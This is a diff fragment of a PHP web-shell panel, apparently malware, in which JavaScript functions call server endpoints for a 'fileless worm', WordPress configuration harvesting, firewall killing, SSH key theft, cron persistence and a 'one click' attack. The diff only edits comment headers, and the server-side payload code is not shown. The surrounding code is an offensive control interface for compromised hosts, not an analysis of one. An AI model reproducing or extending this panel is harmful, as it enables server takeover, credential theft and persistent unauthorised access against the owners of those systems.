-
+// ============================================================
+// HTML + CSS + JAVASCRIPT
+// ============================================================
 ?>
 <!DOCTYPE html>
 <html lang="id">
@@ -4176,7 +4147,6 @@ if (isset($_GET['cron_persistence']) && isset($_SESSION['loggedin']) && $_SESSIO
             apiCall('?worm=1', 'Multi-vector fileless worm executed', 'Worm failed');
         }
 
-        // === SCAN & HARVEST ===
         function runWPScan() {
             if(!confirm('Scan for WordPress configs?')) return;
             apiCall('?wpscan=1', 'WP scan done', 'WP scan failed');
@@ -4212,7 +4182,6 @@ if (isset($_GET['cron_persistence']) && isset($_SESSION['loggedin']) && $_SESSIO
             }
         }
 
-        // === POST-EXPLOIT ===
         function runFirewallKiller() {
             if(!confirm('Kill firewall?')) return;
             apiCall('?firewall_killer=1', 'Firewall killed', 'Firewall kill failed');
@@ -4275,7 +4244,6 @@ if (isset($_GET['cron_persistence']) && isset($_SESSION['loggedin']) && $_SESSIO
             apiCall('?one_click=1&confirm=yes', 'One click executed', 'One click failed');
         }
 
-        // === SSH ===
         function runSSHKeys() {
             apiCall('?sshkeys=1', 'SSH keys found', 'SSH keys failed');
         }
